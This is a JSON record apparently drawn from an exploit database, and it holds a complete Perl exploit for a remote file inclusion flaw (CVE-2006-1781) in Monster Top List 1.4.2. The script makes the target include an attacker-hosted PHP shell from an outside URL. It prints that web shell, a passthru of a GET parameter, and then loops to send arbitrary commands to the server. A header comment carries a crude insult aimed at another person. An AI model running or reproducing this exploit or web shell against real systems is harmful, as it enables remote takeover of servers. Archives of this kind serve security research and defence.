{
  "id": "3530",
  "title": "Monster Top List 1.4.2 - &#039;functions.php?root_path&#039; Remote File Inclusion",
  "cve": "CVE-2006-1781",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n# Monster Top List <= 1.4.2 remote Command Execution Vulnerabilities\r\n#\r\n# Risk : High (Remote Code Execution)\r\n#\r\n# Url: http://www.monstertoplist.com\r\n#\r\n# Exploit:\r\n#   http://site.com/[path]/sources/functions.php?root_path=[Evil_Script]\r\n#\r\n# (c)oded and f0und3d by fluffy_bunny\r\n#\r\n# Romanian Security Team .: hTTp://RSTZONE.NET :.\r\n#\r\n# t0 psyke[pwn]: \"y0ur c0de suqz. y0ur s1t3 suqz. y0u sm3ll 0f sh33p f3c3z. 3y3 th1nk y0u n33d t0\r\n#                t4k3 4n 0nl1n3 w3b d3s1gn c0urz3 0r s0m3th1ng. fuqn d0rk.\"\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"...........................[RST]...............................\\n\";\r\nprint \".                                                             .\\n\";\r\nprint \". Monster Top List <= 1.4.2 RFI spl0it                        .\\n\";\r\nprint \".                                                             .\\n\";\r\nprint \"...............................................................\\n\";\r\nprint \".       Romanian Security Team -> hTTp://RSTZONE.NET          .\\n\";\r\nprint \".       [c]oded by fluffy_bunny - mafia@google.ro             .\\n\";\r\nprint \"...............................................................\\n\\n\";\r\n\r\nmy $kw3,$path,$shell,$conexiune,$cmd,$data ;\r\n\r\n\r\nif ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}\r\n\r\n$path = $ARGV[0];\r\nchomp($path);\r\n$shell = $ARGV[1];    \r\nchomp($shell);\r\n    \r\n$path = $path.\"/sources/functions.php\";\r\n\r\n\r\nsub usage(){\r\n    print \"Usage    : perl $0 host/path http://site.com/cmd.txt\\n\\n\";\r\n    print \"Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\\n\\n\";\r\n    print 'Shell    : <?php ob_clean();ini_set(\"max_execution_time\",0);passthru($_GET[\"cmd\"]);die;?>';\r\n}\r\n\r\nwhile ()  \r\n{  \r\nprint \"[kw3rln].[rst] :~\\$ \";\r\nchomp($cmd=<STDIN>);\r\nif ($cmd eq \"exit\") { exit(0);}\r\n\r\n$kw3 = $path.\"?root_path=\".$shell.\"?&cmd=\".$cmd;\r\nif ($cmd eq \"\")     \r\n  { print \"Enter your command !\\n\"; }\r\nelse\r\n  { $data=get($kw3); print $data ; }\r\n}\r\n\r\n# milw0rm.com [2007-03-20]",
  "url": "https://www.exploit-db.com/exploits/3530"
}